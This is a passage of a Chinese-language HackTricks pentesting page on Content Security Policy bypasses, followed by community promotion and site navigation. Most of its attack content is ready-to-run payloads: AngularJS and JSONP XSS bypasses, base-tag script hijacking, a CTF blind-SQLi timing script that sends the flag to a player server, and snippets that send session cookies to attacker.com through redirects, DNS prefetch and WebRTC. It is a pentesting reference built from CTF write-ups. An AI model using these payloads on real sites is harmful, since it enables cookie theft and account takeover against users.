<p>通过 <strong>利用浏览器和服务器之间 URL 解释的不一致性，可以绕过路径规则</strong>。</p>
<p>解决方案是不要在服务器端将 <code>%2f</code> 视为 <code>/</code>，确保浏览器和服务器之间的一致解释，以避免此问题。</p>
<p>在线示例：<a href="https://jsbin.com/werevijewa/edit?html,output"> </a><a href="https://jsbin.com/werevijewa/edit?html,output">https://jsbin.com/werevijewa/edit?html,output</a></p>
<h3 id="iframes-js-执行"><a class="header" href="#iframes-js-执行">Iframes JS 执行</a></h3>
<p>{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
<a href="../xss-cross-site-scripting/iframes-in-xss-and-csp.html">iframes-in-xss-and-csp.md</a>
{% endcontent-ref %}</p>
<h3 id="缺失-base-uri"><a class="header" href="#缺失-base-uri">缺失 <strong>base-uri</strong></a></h3>
<p>如果缺少 <strong>base-uri</strong> 指令，你可以利用它执行 <a href="../dangling-markup-html-scriptless-injection/"><strong>悬挂标记注入</strong></a>。</p>
<p>此外，如果 <strong>页面使用相对路径加载脚本</strong>（如 <code>&lt;script src="/js/app.js"&gt;</code>）并使用 <strong>Nonce</strong>，你可以利用 <strong>base</strong> <strong>标签</strong> 使其 <strong>从你自己的服务器加载</strong> 脚本，从而实现 <strong>XSS</strong>。<br />
如果易受攻击的页面是通过 <strong>httpS</strong> 加载的，请在 base 中使用 httpS URL。</p>
<pre><code class="language-html">&lt;base href="https://www.attacker.com/"&gt;
</code></pre>
<h3 id="angularjs-事件"><a class="header" href="#angularjs-事件">AngularJS 事件</a></h3>
<p>一个特定的政策称为内容安全政策 (CSP) 可能会限制 JavaScript 事件。尽管如此，AngularJS 引入了自定义事件作为替代。在事件中，AngularJS 提供了一个独特的对象 <code>$event</code>，引用原生浏览器事件对象。这个 <code>$event</code> 对象可以被利用来规避 CSP。值得注意的是，在 Chrome 中，<code>$event/event</code> 对象具有一个 <code>path</code> 属性，包含一个对象数组，涉及事件的执行链，<code>window</code> 对象始终位于末尾。这个结构对于沙箱逃逸策略至关重要。</p>
<p>通过将这个数组传递给 <code>orderBy</code> 过滤器，可以对其进行迭代，利用终端元素（<code>window</code> 对象）触发一个全局函数，如 <code>alert()</code>。下面的代码片段演示了这个过程：</p>
<pre><code class="language-xml">&lt;input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27&gt;#x
?search=&lt;input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'&gt;#x
</code></pre>
<p>这个代码片段突出了使用 <code>ng-focus</code> 指令触发事件，利用 <code>$event.path|orderBy</code> 操作 <code>path</code> 数组，并利用 <code>window</code> 对象执行 <code>alert()</code> 函数，从而揭示 <code>document.cookie</code>。</p>
<p><strong>在</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"><strong>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</strong></a> <strong>中查找其他 Angular 绕过方法</strong></p>
<h3 id="angularjs-和白名单域名"><a class="header" href="#angularjs-和白名单域名">AngularJS 和白名单域名</a></h3>
<pre><code>Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
</code></pre>
<p>一个在 Angular JS 应用程序中为脚本加载列入白名单的 CSP 策略可以通过调用回调函数和某些易受攻击的类来绕过。有关此技术的更多信息，请参阅此 <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it&#x27;s-CSP!%22">git repository</a> 中的详细指南。</p>
<p>有效的有效载荷：</p>
<pre><code class="language-html">&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;
ng-app"ng-csp ng-click=$event.view.alert(1337)&gt;&lt;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js&gt;&lt;/script&gt;

&lt;!-- no longer working --&gt;
&lt;script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"&gt;
</code></pre>
<p>其他 JSONP 任意执行端点可以在 <a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt"><strong>这里</strong></a> 找到（其中一些已被删除或修复）</p>
<h3 id="通过重定向绕过"><a class="header" href="#通过重定向绕过">通过重定向绕过</a></h3>
<p>当 CSP 遇到服务器端重定向时会发生什么？如果重定向导致到一个不被允许的不同源，它仍然会失败。</p>
<p>然而，根据 <a href="https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects">CSP 规范 4.2.2.3. 路径和重定向</a> 中的描述，如果重定向导致到一个不同的路径，它可以绕过原始限制。</p>
<p>这是一个例子：</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=userContent&gt;
&lt;script src="https://https://www.google.com/test"&gt;&lt;/script&gt;
&lt;script src="https://https://www.google.com/a/test"&gt;&lt;/script&gt;
&lt;script src="http://localhost:5555/301"&gt;&lt;/script&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>如果 CSP 设置为 <code>https://www.google.com/a/b/c/d</code>，由于路径被考虑，<code>/test</code> 和 <code>/a/test</code> 脚本将被 CSP 阻止。</p>
<p>然而，最终的 <code>http://localhost:5555/301</code> 将在服务器端 <strong>重定向到 <code>https://www.google.com/complete/search?client=chrome&amp;q=123&amp;jsonp=alert(1)//</code></strong>。由于这是一个重定向，<strong>路径不被考虑</strong>，因此 <strong>脚本可以被加载</strong>，从而绕过路径限制。</p>
<p>通过这种重定向，即使路径完全指定，仍然会被绕过。</p>
<p>因此，最佳解决方案是确保网站没有任何开放重定向漏洞，并且 CSP 规则中没有可以被利用的域。</p>
<h3 id="通过悬挂标记绕过-csp"><a class="header" href="#通过悬挂标记绕过-csp">通过悬挂标记绕过 CSP</a></h3>
<p>阅读 <a href="../dangling-markup-html-scriptless-injection/">如何这里</a>。</p>
<h3 id="unsafe-inline-img-src--通过-xss"><a class="header" href="#unsafe-inline-img-src--通过-xss">'unsafe-inline'; img-src *; 通过 XSS</a></h3>
<pre><code>default-src 'self' 'unsafe-inline'; img-src *;
</code></pre>
<p><code>'unsafe-inline'</code> 意味着您可以在代码中执行任何脚本（XSS 可以执行代码），而 <code>img-src *</code> 意味着您可以在网页中使用来自任何资源的任何图像。</p>
<p>您可以通过图像泄露数据来绕过此 CSP（在这种情况下，XSS 滥用一个 CSRF，其中一个可由机器人访问的页面包含 SQLi，并通过图像提取标志）：</p>
<pre><code class="language-javascript">&lt;script&gt;fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=&gt;_.text()).then(_=&gt;new Image().src='http://PLAYER_SERVER/?'+_)&lt;/script&gt;
</code></pre>
<p>From: <a href="https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle">https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle</a></p>
<p>您还可以利用此配置来<strong>加载插入在图像中的javascript代码</strong>。例如，如果页面允许从Twitter加载图像。您可以<strong>制作</strong>一个<strong>特殊图像</strong>，<strong>上传</strong>到Twitter并利用“<strong>unsafe-inline</strong>”来<strong>执行</strong>一段JS代码（作为常规XSS），该代码将<strong>加载</strong>该<strong>图像</strong>，<strong>提取</strong>其中的<strong>JS</strong>并<strong>执行</strong>它：<a href="https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/">https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/</a></p>
<h3 id="使用服务工作者"><a class="header" href="#使用服务工作者">使用服务工作者</a></h3>
<p>服务工作者的**<code>importScripts</code>**函数不受CSP限制：</p>
<p>{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
<a href="../xss-cross-site-scripting/abusing-service-workers.html">abusing-service-workers.md</a>
{% endcontent-ref %}</p>
<h3 id="策略注入"><a class="header" href="#策略注入">策略注入</a></h3>
<p><strong>研究：</strong> <a href="https://portswigger.net/research/bypassing-csp-with-policy-injection"><strong>https://portswigger.net/research/bypassing-csp-with-policy-injection</strong></a></p>
<h4 id="chrome"><a class="header" href="#chrome">Chrome</a></h4>
<p>如果您发送的<strong>参数</strong>被<strong>粘贴在</strong> <strong>策略的声明</strong>中，那么您可以以某种方式<strong>更改</strong>该<strong>策略</strong>，使其<strong>无效</strong>。您可以使用以下任何绕过方法<strong>允许脚本 'unsafe-inline'</strong>：</p>
<pre><code class="language-bash">script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
</code></pre>
<p>因为这个指令会<strong>覆盖现有的 script-src 指令</strong>。<br />
你可以在这里找到一个例子: <a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E</a></p>
<h4 id="edge"><a class="header" href="#edge">Edge</a></h4>
<p>在 Edge 中更简单。如果你可以在 CSP 中添加这个: <strong><code>;_</code></strong> <strong>Edge</strong> 会<strong>丢弃</strong>整个<strong>策略</strong>。<br />
例子: <a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a></p>
<h3 id="img-src--通过-xss-iframe---时间攻击"><a class="header" href="#img-src--通过-xss-iframe---时间攻击">img-src *; 通过 XSS (iframe) - 时间攻击</a></h3>
<p>注意缺少指令 <code>'unsafe-inline'</code><br />
这次你可以让受害者通过 <strong>XSS</strong> 使用 <code>&lt;iframe</code> 加载一个在<strong>你控制</strong>下的页面。这次你将让受害者访问你想要提取信息的页面（<strong>CSRF</strong>）。你无法访问页面的内容，但如果你能<strong>控制页面加载所需的时间</strong>，你就可以提取所需的信息。</p>
<p>这次将提取一个<strong>标志</strong>，每当通过 SQLi <strong>正确猜测一个字符</strong>时，<strong>响应</strong>由于 sleep 函数会<strong>花费更多时间</strong>。然后，你将能够提取标志:</p>
<pre><code class="language-html">&lt;!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle --&gt;
&lt;iframe name=f id=g&gt;&lt;/iframe&gt; // The bot will load an URL with the payload
&lt;script&gt;
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r =&gt; {
g.onload = r;
});
let diff = performance.now() - h;
return diff &gt; 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i&lt;alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
&lt;/script&gt;
</code></pre>
<h3 id="通过书签小程序"><a class="header" href="#通过书签小程序">通过书签小程序</a></h3>
<p>此攻击将涉及一些社会工程学，攻击者<strong>说服用户将链接拖放到浏览器的书签小程序上</strong>。此书签小程序将包含<strong>恶意的javascript</strong>代码，当被拖放或点击时，将在当前网页窗口的上下文中执行，<strong>绕过CSP并允许窃取敏感信息</strong>，如cookies或tokens。</p>
<p>有关更多信息，请<a href="https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/"><strong>查看原始报告</strong></a>。</p>
<h3 id="通过限制csp绕过csp"><a class="header" href="#通过限制csp绕过csp">通过限制CSP绕过CSP</a></h3>
<p>在<a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution"><strong>这个CTF写作</strong></a>中，CSP通过在允许的iframe中注入更严格的CSP来绕过，该CSP不允许加载特定的JS文件，然后通过<strong>原型污染</strong>或<strong>DOM覆盖</strong>允许<strong>滥用不同的脚本来加载任意脚本</strong>。</p>
<p>您可以使用**<code>csp</code><strong>属性</strong>限制iframe的CSP**：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-html">&lt;iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"&gt;&lt;/iframe&gt;
</code></pre>
<p>{% endcode %}</p>
<p>在<a href="https://github.com/aszx87410/ctf-writeups/issues/48"><strong>这个CTF写作</strong></a>中，通过<strong>HTML注入</strong>可以<strong>进一步限制</strong>一个<strong>CSP</strong>，从而禁用防止CSTI的脚本，因此<strong>漏洞变得可利用。</strong><br />
可以使用<strong>HTML元标签</strong>使CSP更加严格，并且可以通过<strong>移除</strong>允许其<strong>nonce</strong>的<strong>入口</strong>来禁用内联脚本，并通过sha<strong>启用特定的内联脚本</strong>：</p>
<pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';"&gt;
</code></pre>
<h3 id="js-exfiltration-with-content-security-policy-report-only"><a class="header" href="#js-exfiltration-with-content-security-policy-report-only">JS exfiltration with Content-Security-Policy-Report-Only</a></h3>
<p>如果你能让服务器响应带有 <strong><code>Content-Security-Policy-Report-Only</code></strong> 头部且 <strong>值由你控制</strong>（可能是因为 CRLF），你可以让它指向你的服务器，并且如果你 <strong>包裹</strong> 你想要泄露的 <strong>JS 内容</strong> 使用 <strong><code>&lt;script&gt;</code></strong>，并且因为 CSP 很可能不允许 <code>unsafe-inline</code>，这将 <strong>触发 CSP 错误</strong>，并且部分脚本（包含敏感信息）将从 <code>Content-Security-Policy-Report-Only</code> 发送到服务器。</p>
<p>对于一个例子 <a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes"><strong>查看这个 CTF 文章</strong></a>。</p>
<h3 id="cve-2020-6519"><a class="header" href="#cve-2020-6519"><a href="https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/">CVE-2020-6519</a></a></h3>
<pre><code class="language-javascript">document.querySelector('DIV').innerHTML="&lt;iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'&gt;&lt;/iframe&gt;";
</code></pre>
<h3 id="通过csp和iframe泄露信息"><a class="header" href="#通过csp和iframe泄露信息">通过CSP和Iframe泄露信息</a></h3>
<ul>
<li>创建一个指向一个URL的<code>iframe</code>（我们称之为<code>https://example.redirect.com</code>），该URL被CSP允许。</li>
<li>该URL随后重定向到一个秘密URL（例如，<code>https://usersecret.example2.com</code>），该URL <strong>不被</strong> CSP允许。</li>
<li>通过监听<code>securitypolicyviolation</code>事件，可以捕获<code>blockedURI</code>属性。该属性揭示了被阻止的URI的域名，从而泄露了初始URL重定向的秘密域名。</li>
</ul>
<p>有趣的是，像Chrome和Firefox这样的浏览器在处理与CSP相关的iframes时表现不同，可能导致由于未定义行为而泄露敏感信息。</p>
<p>另一种技术涉及利用CSP本身推断秘密子域名。该方法依赖于二分搜索算法，并调整CSP以包含故意被阻止的特定域名。例如，如果秘密子域名由未知字符组成，可以通过修改CSP指令来阻止或允许这些子域名，逐步测试不同的子域名。以下是一个片段，展示了如何设置CSP以促进此方法：</p>
<pre><code class="language-markdown">img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
</code></pre>
<p>通过监控哪些请求被CSP阻止或允许，可以缩小秘密子域名中可能的字符范围，最终揭示完整的URL。</p>
<p>这两种方法利用了CSP在浏览器中的实现和行为的细微差别，展示了看似安全的策略如何无意中泄露敏感信息。</p>
<p>来自<a href="https://ctftime.org/writeup/29310"><strong>这里</strong></a>的技巧。</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入<a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a>服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金启动和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作！</p>
<h2 id="绕过csp的危险技术"><a class="header" href="#绕过csp的危险技术">绕过CSP的危险技术</a></h2>
<h3 id="参数过多时的php错误"><a class="header" href="#参数过多时的php错误">参数过多时的PHP错误</a></h3>
<p>根据<a href="https://www.youtube.com/watch?v=Sm4G6cAHjWM"><strong>这个视频中评论的最后一个技术</strong></a>，发送过多参数（1001个GET参数，尽管你也可以使用POST参数和超过20个文件）。任何在PHP网页代码中定义的**<code>header()</code><strong>都</strong>不会被发送**，因为这将触发错误。</p>
<h3 id="php响应缓冲区溢出"><a class="header" href="#php响应缓冲区溢出">PHP响应缓冲区溢出</a></h3>
<p>PHP以默认方式<strong>缓冲响应至4096</strong>字节。因此，如果PHP显示警告，通过提供<strong>足够的数据在警告中</strong>，<strong>响应</strong>将<strong>在</strong> <strong>CSP头</strong>之前<strong>发送</strong>，导致头被忽略。<br />
然后，这个技术基本上是<strong>用警告填充响应缓冲区</strong>，以便CSP头不被发送。</p>
<p>来自<a href="https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points"><strong>这个写作</strong></a>的想法。</p>
<h3 id="重写错误页面"><a class="header" href="#重写错误页面">重写错误页面</a></h3>
<p>根据<a href="https://blog.ssrf.kr/69"><strong>这个写作</strong></a>，似乎可以通过加载一个错误页面（可能没有CSP）并重写其内容来绕过CSP保护。</p>
<pre><code class="language-javascript">a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `&lt;img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=&gt;x.text()).then(x=&gt;fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))"&gt;`;
}, 1000);
</code></pre>
<h3 id="some--self--wordpress"><a class="header" href="#some--self--wordpress">SOME + 'self' + wordpress</a></h3>
<p>SOME是一种利用XSS（或高度限制的XSS）<strong>在页面的一个端点</strong>中<strong>滥用</strong> <strong>同一来源的其他端点</strong>的技术。这是通过从攻击者页面加载易受攻击的端点，然后将攻击者页面刷新到您想要滥用的同一来源的真实端点来实现的。这样，<strong>易受攻击的端点</strong>可以在<strong>有效载荷</strong>中使用**<code>opener</code><strong>对象来</strong>访问** <strong>要滥用的真实端点的DOM</strong>。有关更多信息，请查看：</p>
<p>{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
<a href="../xss-cross-site-scripting/some-same-origin-method-execution.html">some-same-origin-method-execution.md</a>
{% endcontent-ref %}</p>
<p>此外，<strong>wordpress</strong>在<code>/wp-json/wp/v2/users/1?_jsonp=data</code>中有一个<strong>JSONP</strong>端点，该端点将<strong>反射</strong>输出中发送的<strong>数据</strong>（仅限字母、数字和点的限制）。</p>
<p>攻击者可以利用该端点<strong>生成针对WordPress的SOME攻击</strong>并将其嵌入<code>&lt;script s</code>rc=<code>/wp-json/wp/v2/users/1?_jsonp=some_attack&gt;&lt;/script&gt;</code>中，请注意这个<strong>脚本</strong>将被<strong>加载</strong>，因为它是<strong>被'self'允许的</strong>。此外，由于安装了WordPress，攻击者可能会通过<strong>易受攻击的</strong> <strong>回调</strong>端点滥用<strong>SOME攻击</strong>，该端点<strong>绕过CSP</strong>以给予用户更多权限，安装新插件...<br />
有关如何执行此攻击的更多信息，请查看<a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a></p>
<h2 id="csp-exfiltration-bypasses"><a class="header" href="#csp-exfiltration-bypasses">CSP Exfiltration Bypasses</a></h2>
<p>如果存在严格的CSP，不允许您<strong>与外部服务器交互</strong>，则始终可以做一些事情来提取信息。</p>
<h3 id="location"><a class="header" href="#location">Location</a></h3>
<p>您可以仅更新位置以将机密信息发送到攻击者的服务器：</p>
<pre><code class="language-javascript">var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
</code></pre>
<h3 id="meta-tag"><a class="header" href="#meta-tag">Meta tag</a></h3>
<p>您可以通过注入元标签进行重定向（这只是重定向，不会泄露内容）</p>
<pre><code class="language-html">&lt;meta http-equiv="refresh" content="1; http://attacker.com"&gt;
</code></pre>
<h3 id="dns-prefetch"><a class="header" href="#dns-prefetch">DNS Prefetch</a></h3>
<p>为了更快地加载页面，浏览器将预先解析主机名为IP地址并将其缓存以供后续使用。<br />
您可以通过以下方式指示浏览器预解析主机名：<code>&lt;link rel="dns-prefetch" href="something.com"&gt;</code></p>
<p>您可以利用这种行为来<strong>通过DNS请求外泄敏感信息</strong>：</p>
<pre><code class="language-javascript">var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "&lt;link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\"&gt;";
</code></pre>
<p>另一种方法：</p>
<pre><code class="language-javascript">const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
</code></pre>
<p>为了避免这种情况发生，服务器可以发送HTTP头：</p>
<pre><code>X-DNS-Prefetch-Control: off
</code></pre>
<p>{% hint style="info" %}
显然，这种技术在无头浏览器（机器人）中不起作用
{% endhint %}</p>
<h3 id="webrtc"><a class="header" href="#webrtc">WebRTC</a></h3>
<p>在几个页面上你可以看到<strong>WebRTC不检查CSP的<code>connect-src</code>策略</strong>。</p>
<p>实际上，你可以通过一个_DNS请求_来_泄露_信息。看看这段代码：</p>
<pre><code class="language-javascript">(async()=&gt;{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
</code></pre>
<p>另一个选项：</p>
<pre><code class="language-javascript">var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=&gt;pc.setLocalDescription(sdp);
</code></pre>
<h2 id="在线检查csp策略"><a class="header" href="#在线检查csp策略">在线检查CSP策略</a></h2>
<ul>
<li><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com/</a></li>
<li><a href="https://cspvalidator.org/#url=https://cspvalidator.org/">https://cspvalidator.org/</a></li>
</ul>
<h2 id="自动创建csp"><a class="header" href="#自动创建csp">自动创建CSP</a></h2>
<p><a href="https://csper.io/docs/generating-content-security-policy">https://csper.io/docs/generating-content-security-policy</a></p>
<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
<ul>
<li><a href="https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/">https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/</a></li>
<li><a href="https://lcamtuf.coredump.cx/postxss/">https://lcamtuf.coredump.cx/postxss/</a></li>
<li><a href="https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d">https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d</a></li>
<li><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme">https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme</a></li>
<li><a href="https://www.youtube.com/watch?v=MCyPuOWs3dg">https://www.youtube.com/watch?v=MCyPuOWs3dg</a></li>
<li><a href="https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/">https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/</a></li>
<li><a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a></li>
</ul>
<p>​</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作！</p>
<p>{% hint style="success" %}
学习与实践AWS黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家(ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践GCP黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家(GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord小组</strong></a> 或 <a href="https://t.me/peass"><strong>电报小组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/command-injection.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/command-injection.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
